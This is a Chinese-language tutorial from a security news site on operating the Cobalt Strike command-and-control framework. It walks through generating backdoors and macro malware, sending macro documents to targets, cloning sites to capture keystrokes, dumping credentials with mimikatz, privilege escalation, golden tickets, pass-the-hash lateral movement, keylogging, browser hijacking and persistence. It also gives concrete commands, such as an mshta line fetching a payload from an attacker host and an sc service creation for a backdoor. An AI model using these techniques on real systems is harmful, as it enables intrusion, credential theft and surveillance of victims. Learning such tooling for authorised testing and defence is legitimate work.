# CobaltStrike使用详解

阅读量 **454101**

|评论 **1**

发布时间 : 2021-03-22 18:00:07

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

##

## CobaltStrike

CobaltStrike是一款渗透测试神器，被业界人称为CS神器。CobaltStrike分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。

CobaltStrike集成了端口转发、服务扫描，自动化溢出，多模式端口监听，windows exe 木马生成，windows dll 木马生成，java
木马生成，office 宏病毒生成，木马捆绑。钓鱼攻击包括：站点克隆，目标信息获取，java 执行，浏览器自动攻击等等强大的功能！

## CobaltStrike的安装

我这里以Kali安装为例：

    
    
    上传到Kali中，解压：tar -xzvf jdk-8u191-linux-x64.tar.gz
    移动到opt目录下： mv jdk1.8.0_191/ /opt/
    进入jdk目录：cd  /opt/jdk1.8.0_191
    ​
    执行 vim  ~/.bashrc ， 并添加下列内容
    # install JAVA JDK
    export JAVA_HOME=/opt/jdk1.8.0_191
    export CLASSPATH=.:${JAVA_HOME}/lib
    export PATH=${JAVA_HOME}/bin:$PATH
    保存退出
    执行: source ~/.bashrc
    ​
    执行：
    update-alternatives --install /usr/bin/java java /opt/jdk1.8.0_191/bin/java 1
    update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_191/bin/javac 1
    update-alternatives --set java /opt/jdk1.8.0_191/bin/java
    update-alternatives --set javac /opt/jdk1.8.0_191/bin/javac
    ​
    查看结果：
    update-alternatives --config java
    update-alternatives --config javac

安装好了java之后，我们就去安装CobalStrike了！

    
    
    上传到Kali中，解压：unzip cobaltstrike-linux.zip
    进入cobalstrike中：cd cobaltstrike-linux/
    

**启动服务端：**

CobaltStrike一些主要文件功能如下：

· agscript：扩展应用的脚本

· c2lint：用于检查profile的错误和异常

· teamserver：服务器端启动程序

· cobaltstrike.jar：CobaltStrike核心程序

· cobaltstrike.auth：用于客户端和服务器端认证的文件，客户端和服务端有一个一模一样的

· cobaltstrike.store：秘钥证书存放文件

一些目录作用如下：

· data：用于保存当前TeamServer的一些数据

· download：用于存放在目标机器下载的数据

· upload：上传文件的目录

· logs：日志文件，包括Web日志、Beacon日志、截图日志、下载日志、键盘记录日志等

· third-party：第三方工具目录

    
    
    启动服务端： ./teamserver   192.168.10.11  123456    #192.168.10.11是kali的ip地址，123456是密码
    后台运行，关闭当前终端依然运行：nohup  ./teamserver   192.168.10.11  123456  &
    ​
    这里CobaltStrike默认监听的是50050端口，如果我们想修改这个默认端口的话，可以打开teamserver文件，将其中的50050修改成任意一个端口号

**启动客户端：**

    
    
    ./cobaltstrike点击并拖拽以移动

这里host填kali的ip，密码就是刚刚我们启动的密码。

启动后的客户端：

我们也可以打开windows下的cobaltstrike客户端，然后把ip设置为我们的启动时候的ip即可。

## CobaltStrike的使用

![](https://p4.ssl.qhimg.com/t0119a7c2964fa07136.png)

### CobaltStrike模块

· New Connection：打开一个新连接窗口

· Preferences：偏好设置，就是设置CobaltStrike外观的

· Visualization：将主机以不同的权限展示出来(主要以输出结果的形式展示)

· VPN Interfaces：设置VPN接口

· Listeners：创建监听器

· Script Interfaces：查看和加载CNA脚本

· Close：关闭

### 创建监听器Listener

CobaltStrike的内置监听器为Beacon，外置监听器为Foreign。CobaltStrike的Beacon支持异步通信和交互式通信。

点击左上方CobaltStrike选项——>在下拉框中选择 Listeners ——>在下方弹出区域中单机add

    
    
    name：为监听器名字，可任意
    payload：payload类型
    HTTP Hosts: shell反弹的主机，也就是我们kali的ip
    HTTP Hosts(Stager): Stager的马请求下载payload的地址
    HTTP Port(C2): C2监听的端口

CobaltStrike4.0目前有以下8种Payload选项，如下：

**内部的Listener**

· windows/beacon_dns/reverse_dns_txt

· windows/beacon_http/reverse_http

· windows/beacon_https/reverse_https

· windows/beacon_bind_tcp

· windows/beacon_bind_pipe

**外部的Listener**

· windows/foreign/reverse_http

· windows/foreign/reverse_https

**External**

· windows/beacon_extc2

Beacon为内置的Listener，即在目标主机执行相应的payload，获取shell到CS上；其中包含DNS、HTTP、HTTPS、SMB。Beacon可以选择通过DNS还是HTTP协议出口网络，你甚至可以在使用Beacon通讯过程中切换HTTP和DNS。其支持多主机连接，部署好Beacon后提交一个要连回的域名或主机的列表，Beacon将通过这些主机轮询。目标网络的防护团队必须拦截所有的列表中的主机才可中断和其网络的通讯。通过种种方式获取shell以后（比如直接运行生成的exe），就可以使用Beacon了。

Foreign为外部结合的Listener，常用于MSF的结合，例如获取meterpreter到MSF上。

关于DNS Beacon的使用：[CobaltStrike中DNS
Beacon的使用](https://xie1997.blog.csdn.net/article/details/106423900)

## 创建攻击Attacks(生成后门)

**点击中间的攻击—— >生成后门**

这里Attacks有几种，如下：

· HTML Application 生成一个恶意HTML Application木马，后缀格式为 .hta。通过HTML调用其他语
言的应用组件进行攻击，提供了 可执行文件、PowerShell、VBA三种方法。

· MS Office Macro 生成office宏病毒文件；

· Payload Generator 生成各种语言版本的payload，可以生成基于C、C#、COM Scriptlet、Java、Perl、
PowerShell、Python、Ruby、VBA等的payload

· Windows Executable 生成32位或64位的exe和基于服务的exe、DLL等后门程序

· Windows Executable(S) 用于生成一个exe可执行文件，其中包含Beacon的完整payload，不需要阶段性的请求。与Windows
Executable模块相比，该模块额外提供了代理设置，以便在较为苛刻的环境中进行渗透测试。该模块还支持powershell脚本，可用于将Stageless
Payload注入内存

### HTML Application

HTML Application用于生成hta类型的文件。HTA是HTML
Application的缩写（HTML应用程序），是软件开发的新概念，直接将HTML保存成HTA的格式，就是一个独立的应用软件，与VB、C++等程序语言所设计的软件界面没什么差别。HTML
Application有三种类型的生成方式，测试发现，只有powershell方式生成的hta文件才能正常执行上线，Executable和VBA方式生成的hta文件执行的时候提示当前页面的脚本发生错误。

基于PowerShell方式生成的hta文件，执行上线

执行mshta上线成功：mshta <http://xx.xx.xx.xx/download/file.ext>

基于Executable方式生成的hta文件，执行报错如下

![](https://p1.ssl.qhimg.com/t017db0d9833f78c638.png)

基于VBA方式生成的hta文件，执行报错如下

### MS Office Macro

攻击——>生成后门——>MS Office Macro

然后选择一个监听器，点击Generate

然后点击Copy Macro

然后打开word编辑器，点击视图，然后点击宏

随便输入一个宏名，点击创建

先清除这里面的所有代码，然后复制CobaltStrike生成的代码，保存退出。

将该文档发给其他人，只要他是用word打开，并且开启了宏，我们的CS就会收到弹回来的shell，进程名是rundll32.exe。

word开启禁用宏：文件——>选项——>信任中心——>信任中心设置

### Payload Generator

这个模块用于生成各种语言版本的shellcode，然后用其他语言进行编译生成，可参考：[MSF木马的免杀(三)](https://xie1997.blog.csdn.net/article/details/106348527)

### Windows Executable & Windows Executable(S)

这两个模块直接用于生成可执行的 exe 文件或 dll 文件。Windows Executable是生成Stager类型的马，而Windows
Executable(S) 是生成Stageless类型的马。那Stager和Stageless有啥区别呢？

·
Stager是分阶段传送Payload。分阶段啥意思呢？就是我们生成的Stager马其实是一个小程序，用于从服务器端下载我们真正的shellcode。分阶段在很多时候是很有必要的，因为很多场景对于能加载进内存并成功漏洞利用后执行的数据大小存在严格限制。所以这种时候，我们就不得不利用分阶段传送了。如果不需要分阶段的话，可以在C2的扩展文件里面把
host_stage 选项设置为 false。

·
而Stageless是完整的木马，后续不需要再向服务器端请求shellcode。所以使用这种方法生成的木马会比Stager生成的木马体积要大。但是这种木马有助于避免反溯源，因为如果开启了分阶段传送，任何人都能连接到你的C2服务器请求payload，并分析payload中的配置信息。在CobaltStrike4.0及以后的版本中，后渗透和横向移动绝大部分是使用的Stageless类型的木马。

Windowss Executable(S)相比于Windows
Executable，其中包含Beacon的完整payload，不需要阶段性的请求，该模块额外提供了代理设置，以便在较为苛刻的环境中进行渗透测试。该模块还支持powershell脚本，可用于将Stageless
Payload注入内存。

注意，生成的Windows Service EXE生成的木马，直接双击是不会返回session的。需要以创建服务的方式启动，才会返回session。

    
    
    #注意，等号（=）后面要有空格
    sc create autoRunBackDoor binPath= "cmd.exe /c C:\users\administrator\desktop\cs.exe" start= auto DisplayName= autoRunBackDoor
    #开启某个系统服务
    sc start autoRunBackDoor 
    #停止某个系统服务
    sc stop autoRunBackDoor 
    # 删除某个系统服务
    sc delete service_name

## 创建攻击Attacks(钓鱼攻击)

点击中间的Attacks——>Web Drive-by（网站钓鱼攻击）

· web服务管理 对开启的web服务进行管理；

· 克隆网站 克隆网站，可以记录受害者提交的数据；

· 文件下载 提供一个本地文件下载，可以修改Mime信息。可以配合DNS欺骗实现挂马效果使用

· Scripted Web Delivery(S) 基于Web的攻击测试脚本，自动生成可执行的payload
，通常用这个模块来生成powershell命令反弹shell

· 签名Applet攻击 启动一个Web服务以提供自签名Java Applet的运行环境;

· 智能攻击 自动检测Java版本并利用已知的exploits绕过security；

· 信息搜集 用来获取一些系统信息，比如系统版本，Flash版本，浏览器版本等。

### 克隆网站

该模块用来克隆一个网站，来获取用户的键盘记录

然后访问URL

cs的web日志可以查看到目标访问的键盘记录

![](https://p5.ssl.qhimg.com/t01a10cd47a79e6c736.png)

###

### 信息搜集

该模块用来获取用户的系统信息、浏览器信息。

然后只要目标访问我们的这个链接，就会自动跳转到百度，并且我们的cs可以获取到目标系统和浏览器的信息

## 视图View

点击中间的View

· Applications 显示受害者机器的应用信息；

· Credentials 显示受害者机器的凭证信息，通过hashdump和mimikatz获取的密码都保存在这里；

· Downloads 查看从被控机器上下载的文件；

· Event Log 可以看到事件日志，清楚的看到系统的事件,并且团队可以在这里聊天;

· Keystrokes 查看键盘记录；

· Proxy Pivots 查看代理信息；

· Screenshots 查看屏幕截图；

· Script Console 在这里可以加载各种脚本以增强功能，脚本地址：<https://github.com/rsmudge/cortana-scripts>

· Targets 查看目标；

· Web Log 查看web日志。

## 对被控主机的操作

    
    
    Interact       打开beacon
    Access 
        dump hashes   获取hash
        Elevate       提权
        Golden Ticket 生成黄金票据注入当前会话
        MAke token    凭证转换
        Run Mimikatz  运行 Mimikatz 
        Spawn As      用其他用户生成Cobalt Strike的beacon
    Explore
        Browser Pivot 劫持目标浏览器进程
        Desktop(VNC)  桌面交互
        File Browser  文件浏览器
        Net View      命令Net View
        Port scan     端口扫描
        Process list  进程列表
        Screenshot    截图
    Pivoting
        SOCKS Server 代理服务
        Listener     反向端口转发
        Deploy VPN   部署VPN
    Spawn            新的通讯模式并生成会话
    Session          会话管理，删除，心跳时间，退出，备注

## 抓取hash和dump明文密码

这两项功能都需要管理员权限，如果权限不足，先提权

· 抓取密码哈希：右键被控主机——>Access——>Dump Hashes

· 利用mimikatz抓取明文密码：右键被控主机——>Access——>Run Mimikatz

抓取密码哈希，也可以直接输入： **hashdump**

使用mimikatz抓取明文密码，也可以直接输入： **logonpasswords**

抓取完之后，点击凭证信息，就会显示我们抓取过的哈希或者明文。这里我们也可以手动添加或修改凭证信息

## 提权(Elevate)

当获取的当前权限不够时，可以使用提权功能

右键被控主机——>Access——>Elevate

亲测Windows Server 2008R2 、Win7 及以下系统可用。Win10不可用

默认有三个提权payload可以使用，分别是MS14-058、uac-dll、uac-token-duplication 。

我们选中MS14-058，点击Launch

之后就弹回来一个system权限的beacon

我们也可以自己加入一些提权脚本进去。在Github上有一个提权工具包，使用这个提权工具包可以增加几种提权方法：<https://github.com/rsmudge/ElevateKit>
。我们下载好该提权工具包后

如下，

再打开我们的提权，可以看到多了几种提权方式了

### 利用被控主机建立Socks4代理

当我们控制的主机是一台位于公网和内网边界的服务器 ，我们想利用该主机继续对内网进行渗透，于是，我们可以利用CS建立socks4A代理

右键被控主机——>Pivoting——>SOCKS Server

这里是SOCKS代理运行的端口，任意输入一个未占用的端口即可，默认CS会给出一个，我们直接点击Launch即可。

于是，我们在自己的主机上设置Socks4代理。代理ip是我们CS服务端的ip，端口即是 38588。

如果我们想查看整个CS代理的设置，可以点击View——>Proxy Pivots

然后我们可以直接在浏览器设置socks4代理

或者可以点击Tunnel，然后会给我们一个MSF的代理：setg Proxies socks4:xx.xx.xx.xx:38588

### 进程列表(注入进程，键盘监控)

右键被控主机——>Explore——>Process List

即可列出进程列表

选中该进程，Kill为杀死该进程，Refresh为刷新该进程，Inject 则是把beacon注入进程，Log
Keystrokes为键盘记录，Screenshot 为截图，Stea Token为窃取运行指定程序的用户令牌

这里着重讲一下注入进程和键盘记录

**Inject注入进程**

选择进程，点击Inject，随后选择监听器，点击choose，即可发现CobaltStrike弹回了目标机的一个新会话，这个会话就是成功注入到某进程的beacon会话。该功能可以把你的beacon会话注入到另外一个程序之中，注入之后，除非那个正常进程被杀死了，否则我们就一直可以控制该主机了。

    
    
    inject  进程PID  进程位数  监听

**键盘记录**

任意选择一个进程，点击 **Log Keystrokes** ，即可监听该主机的键盘记录

    
    
    keylogger  进程PID  进程位数

查看键盘记录结果：点击钥匙一样的按钮，就可以在底下看到键盘记录的详细了，会监听所有的键盘记录，而不只是选中的进程的键盘记录

键盘监听记录，也可以直接输入 **keylogger**

### 浏览器代理Browser Pivot

使用浏览器代理功能，我们可以注入到目标机器的浏览器进程中。然后在本地浏览器中设置该代理，这样，我们可以在本地浏览器上访问目标机器浏览器已经登录的网站，而不需要登录。但是目前浏览器代理只支持IE浏览器。如下，目标主机的IE浏览器目前在访问fofa，并且已登录。现在我们想利用浏览器代理在本地利用目标主机身份进行访问。

选中目标，邮件浏览器代理，然后选中IE浏览器的进程

这里看到IE浏览器有两个进程，分别是 6436和6544，我们随便选中一个即可。我这里选择 6544进程，然后下面会有一个默认的代理服务端口。点击开始

可以看到命令行如下：browserpivot 6544 x86

![](https://p5.ssl.qhimg.com/t017fe7afbc0578b7b9.png)

然后视图代理信息可以看到刚刚建立的浏览器代理。这里的意思是，TeamServer监听59398和26193端口。流程是这样，我们将流量给59398端口，59398端口将流量给26193端口，26193将流量给目标主机的26193端口。

![](https://p5.ssl.qhimg.com/t01dafe528876ff1c07.png)

我们这里代理设置TeamServer服务器的ip和59398端口即可。

访问Fofa，可以看到以目标身份登录了网站。

### 生成黄金票据注入当前会话(Golden Ticket)

生成黄金票据的前提是我们已经获得了krbtgt用户的哈希：9ce0b40ed1caac7523a22d574b32deb2
。并且已经获得一个以域用户登录的主机权限

右键当前获得的主机——>Access——>Golden Ticket

在弹出来的对话框中输入以下：

· User：要伪造用户名，这里我们一般填administrator

· Domain：域名

· Domain SID：域SID

· Krbtgt Hash：krbtgt用户的哈希

然后点击Build即可

这是输入框自动执行的mimikatz命令，如图票据传递攻击成功。我们查看域控的C盘，输入如下命令

    
    
    shell  dir\\win2008.xie.com\c$

### 凭证转换(Make Token)

如果我们已经获得了域内其他用户的账号密码，就可以使用此模块生成令牌，此时生成的令牌具有指定用户的身份。

右键当前获得的主机——>Access——>Make Token

输入已经获得了域用户的账号密码和域名，点击Build

日志框内的记录

### 端口扫描

右键——>目标——>端口扫描，然后填入要扫描的端口和网段。这里我们也可以直接执行命令：

    
    
    portscan 192.168.10.1-192.168.10.10 22,445 arp  1024
    portscan 192.168.10.1-192.168.10.10 22,445 icmp 1024
    portscan 192.168.10.1-192.168.10.10 22,445 none 1024
    ​
    一般我们直接运行命令
    portscan 192.168.1.0/24 22,445,1433,3306
    

扫完了之后，直接在控制台就会有结果。

我们点击视图——>目标，就会出现网段中存活的主机。(这是通过端口扫描探测到的结果显示的，要想这里显示，必须得先进行扫描端口)

### 哈希传递攻击或SSH远程登录

进行了上一步的端口扫描后，我们这里视图——>目标就会有当前网段的存活主机。

![](https://p2.ssl.qhimg.com/t018151bd01f522f07e.png)

**对于Linux机器，如果我们知道账号密码的话，可以远程SSH连接，并返回一个CS的session。**

需要一台服务器作为中继才可以控制Linux服务器，我们这里先获取到一个windows服务器的权限，然后进入windows服务器的beacon进行执行命令

可以两种方式远程连接：ssh 和 ssh-key

可以图形化操作，也可以命令行操作：ssh 192.168.10.13:22 root root

![](https://p4.ssl.qhimg.com/t0178096e98a59c4a02.png)

![](https://p5.ssl.qhimg.com/t0111c922701b13db6d.png)

![](https://p3.ssl.qhimg.com/t01f61f585e33031a14.png)

![](https://p1.ssl.qhimg.com/t01740ef68232409e77.png)

**对于Linux机器，也可以使用SSH公私钥进行登录，并返回一个CS的session。**

需要一台服务器作为中继才可以控制Linux服务器，我们这里先获取到一个windows服务器的权限，然后进入windows服务器的beacon进行执行命令

首先，将公钥authorized_keys放到目标主机的/root/.ssh/目录下

然后我们本地机器放私钥，远程连接

    
    
    ssh-key 192.168.10.13:22 root e:\id_rsa

**对于Windows机器，如果我们获取到账号和密码(明文或者哈希)，都可以进行远程连接**

远程连接的前提是目标机器开放了445端口，然后CS会通过远程连接开启一个CS的seesion。可以用以下方式远程连接：psexec
、psexec64、psexec_psh 、winrm 和 winrm64。实测使用 psexec_psh 成功率最高。

已经得到机器Win2008的密码为：root
（329153f560eb329c0e1deea55e88a1e9），现在想哈希传递Win2003机器。监听器为：test

    
    
    如果知道知道密码哈希的话：
    ​
    rev2self
    pth WIN2008\Administrator 329153f560eb329c0e1deea55e88a1e9
    ​
    psexec的命令：jump psexec WIN2003 test
    psexec64的命令jump psexec64 WIN2003 test
    psexec_psh的命令：jump psexec_psh WIN2003 test
    winrm的命令：jump winrm WIN2003 test
    winrm64的命令： jump winrm64 WIN2003 test
    ​
    如果是知道明文密码的话：
    ​
    rev2self
    make_token WIN2008\Administrator root
    ​
    psexec的命令：jump psexec WIN2003 test
    psexec64的命令jump psexec64 WIN2003 test
    psexec_psh的命令：jump psexec_psh WIN2003 test
    winrm的命令：jump winrm WIN2003 test
    winrm64的命令： jump winrm64 WIN2003 test

**如果遇到目标机器不出网的情况，则我们需要在已经被控的主机上建立一个listen，以此作为中继。**

![](https://p2.ssl.qhimg.com/t013470509415db26c5.png)

![](https://p1.ssl.qhimg.com/t01a90168bd66231357.png)

然后攻击的时候的监听器选择我们刚刚用被控主机建立的listen即可。

![](https://p0.ssl.qhimg.com/t0199f4de64ad2920fd.png)

![](https://p5.ssl.qhimg.com/t015a7bc134b32b1dc8.png)

![](https://p2.ssl.qhimg.com/t01b05d9bce69d1b01a.png)

当在目标主机执行了该木马后，就可以看到上线了。我们可以在Beacon上用link <ip>命令链接它或者unlink <ip>命令断开它

但是这样会导致的一个后果就是，只要第一个被控主机掉线，通过该主机中继打下的内网其他主机也都会掉线。

###

### 导入并执行本地的PowerShell脚本

  * powershell-import：该模块可以将本地PowerShell脚本加载到目标系统的内存中，然后使用PowerShell执行所加载脚本中的方法
  * powershell：该模块通过调用PowerShell.exe 来执行命令
  * powerpick：该命令可以不通过调用PowerShell.exe 来执行命令

    
    
    powershell-import E:\PowerView.ps1
    powershell Get-NetUser | select name

### Beacon TCP的使用

我们打下了一个目标机器192.168.202.54，但是该机器不出网，我们现在想让其上线cs。我们的思路是这样的，通过配置代理，让本地虚拟机可以访问到目标机器。然后让本地虚拟机上线cs，走bind_tcp去连接目标机器。

  * 本地虚拟机：192.168.10.132
  * 目标机器：192.168.10.128(不出网)

**本地虚拟机上线cs，配置proxifier**

使用本地虚拟机，使用exe或powershell方式上线cs(注意不要用派生的session)。

在win2008机器上配置好proxifier，如下

![](https://p1.ssl.qhimg.com/t017206f677aaba4760.png)

![](https://p0.ssl.qhimg.com/t016f8e3acccde7d4fe.png)

**监听bind_tcp**

设置bind_tcp监听方式，默认监听42585端口，我们可以自己修改。

![](https://p5.ssl.qhimg.com/t01c4f3795cd12426b6.png)

生成bind_tcp的木马

![](https://p2.ssl.qhimg.com/t015999c3527073d5b4.png)

将该木马上传到win7机器上，执行，可以看到，监听了42585端口

![](https://p3.ssl.qhimg.com/t01c862971bc7d9fe7b.png)

然后可以在cs上上线的机器探测端口：

    
    
    portscan 192.168.10.128 42585 none 64

在win2008机器上执行命令，可以看到win7正常上线

    
    
    连接
    connect  192.168.10.128 
    取消连接
    unlink   192.168.10.128 

点进去win7的session里面，输入 sleep 1

![](https://p1.ssl.qhimg.com/t011be69b230a699ac8.png)

![](https://p2.ssl.qhimg.com/t017b1c6ce0060666df.png)

![](https://p5.ssl.qhimg.com/t01259065a4f8dc5527.png)

### Beacon SMB的使用

SMB
Beacon使用命名管道与父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB
Beacon相对隐蔽，绕防火墙时可能发挥奇效。 这张图很好的诠释了SMB beacon的工作流程。

![](https://p5.ssl.qhimg.com/t01e4a14d8e46cd0e1e.png)

**SMB Beacon的使用条件：**

  * 具有 SMB Beacon 的主机必须接受 445 端口上的连接
  * 只能链接由同一个 Cobalt Strike 实例管理的 Beacon
  * 利用这种beacon横移必须有目标主机的管理员组的权限或者说是拥有具有管理员组权限的凭据。

**SMB Beacon的使用场景：**

  1. 我们知道了目标机器的管理员账号的明文密码或密码哈希。但是目标主机不出网，所以我们想利用SMB Beacon正向连接让其上线。
  2. 还有一种使用场景是，在域环境中，我们已经得到一个域用户的账号密码。由于在域中，默认域用户可以登录除域控外的所有主机。所以我们可以利用该域用户与其他主机建立IPC连接，然后让其他主机进行SMB Beacon上线。

首先，建立一个SMB Beacon的监听：SMB_Beacon

![](https://p4.ssl.qhimg.com/t01d1bde692455ce924.png)

**利用明文密码让其上线SMB Beacon**

先建立一个IPC连接，然后连接：

    
    
    shell net use \\192.168.10.132 /u:administrator root
    jump psexec_psh 192.168.10.132 SMB_Beacon
    ​
    取消连接
    unlink 192.168.10.132

**利用密码哈希上线SMB Beacon**

    
    
    rev2self
    pth WIN2003\Administrator 329153f560eb329c0e1deea55e88a1e9
    jump psexec_psh 192.168.10.132 SMB_Beacon
    ​
    取消连接
    unlink 192.168.10.132点击并拖拽以移动

![](https://p0.ssl.qhimg.com/t01fc6f9205eae7b85d.png)

## CobaltStrike常见命令

    
    
    BeaconCommands
    ===============
        Command                   Description
        -------                   -----------        browserpivot              注入受害者浏览器进程
        bypassuac                 绕过UAC
        cancel                    取消正在进行的下载
        cd                        切换目录
        checkin                   强制让被控端回连一次
        clear                     清除beacon内部的任务队列
        connect                   Connect to a Beacon peerover TCP
        covertvpn                 部署Covert VPN客户端
        cp                        复制文件
        dcsync                    从DC中提取密码哈希
        desktop                   远程VNC
        dllinject                 反射DLL注入进程
        dllload                   使用LoadLibrary将DLL加载到进程中
        download                  下载文件
        downloads                 列出正在进行的文件下载
        drives                    列出目标盘符
        elevate                   尝试提权
       execute                   在目标上执行程序(无输出)
        execute-assembly          在目标上内存中执行本地.NET程序
        exit                      退出beacon
        getprivs                  Enable system privileges oncurrent token
        getsystem                 尝试获取SYSTEM权限
        getuid                    获取用户ID
        hashdump                  转储密码哈希值
        help                      帮助
        inject                    在特定进程中生成会话
        jobkill                   杀死一个后台任务
        jobs                      列出后台任务
        kerberos_ccache_use       从ccache文件中导入票据应用于此会话
        kerberos_ticket_purge     清除当前会话的票据
        kerberos_ticket_use       从ticket文件中导入票据应用于此会话
        keylogger                 键盘记录
        kill                      结束进程
        link                      Connect to a Beacon peerover a named pipe
        logonpasswords            使用mimikatz转储凭据和哈希值
        ls                        列出文件
        make_token                创建令牌以传递凭据
        mimikatz                  运行mimikatz
        mkdir                     创建一个目录
        mode dns                  使用DNS A作为通信通道(仅限DNS beacon)
        mode dns-txt              使用DNS TXT作为通信通道(仅限D beacon)
        mode dns6                 使用DNS AAAA作为通信通道(仅限DNS beacon)
        mode http                 使用HTTP作为通信通道
        mv                        移动文件
        net                       net命令
        note                      备注      
        portscan                  进行端口扫描
        powerpick                 通过Unmanaged PowerShell执行命令
        powershell                通过powershell.exe执行命令
        powershell-import         导入powershell脚本
        ppid                      Set parent PID forspawned post-ex jobs
        ps                        显示进程列表
        psexec                    Use a service to spawn asession on a host
        psexec_psh                Use PowerShell to spawn asession on a host
        psinject                  在特定进程中执行PowerShell命令
        pth                       使用Mimikatz进行传递哈希
        pwd                       当前目录位置
        reg                       Query the registry
        rev2self                  恢复原始令牌
        rm                        删除文件或文件夹
        rportfwd                  端口转发
        run                       在目标上执行程序(返回输出)
        runas                     以另一个用户权限执行程序
        runasadmin                在高权限下执行程序
        runu                      Execute a program underanother PID
        screenshot                屏幕截图
        setenv                    设置环境变量
        shell                     cmd执行命令
        shinject                  将shellcode注入进程
        shspawn                   生成进程并将shellcode注入其中
        sleep                     设置睡眠延迟时间
        socks                     启动SOCKS4代理
        socks stop                停止SOCKS4
        spawn                     Spawn a session
        spawnas                   Spawn a session as anotheruser
        spawnto                  Set executable tospawn processes into
        spawnu                    Spawn a session underanother PID
        ssh                       使用ssh连接远程主机
        ssh-key                   使用密钥连接远程主机
        steal_token               从进程中窃取令牌
        timestomp                 将一个文件时间戳应用到另一个文件
        unlink                    Disconnect from parentBeacon
        upload                    上传文件
        wdigest                   使用mimikatz转储明文凭据
        winrm                     使用WinRM在主机上生成会话
        wmi                       使用WMI在主机上生成会话
        argue                     进程参数欺骗

如果你想和我一起讨论的话，那就加入我的知识星球吧！

![](https://p0.ssl.qhimg.com/t010b64eaeef363eaa4.png)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **谢公子** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/235251](/post/id/235251)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全工具](/tag/安全工具)
  * [CobaltStrike](/tag/CobaltStrike)

 **+1** __13赞

 __收藏

![](https://p4.ssl.qhimg.com/t01330ae7f74b7b9f2d.png) 谢公子

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

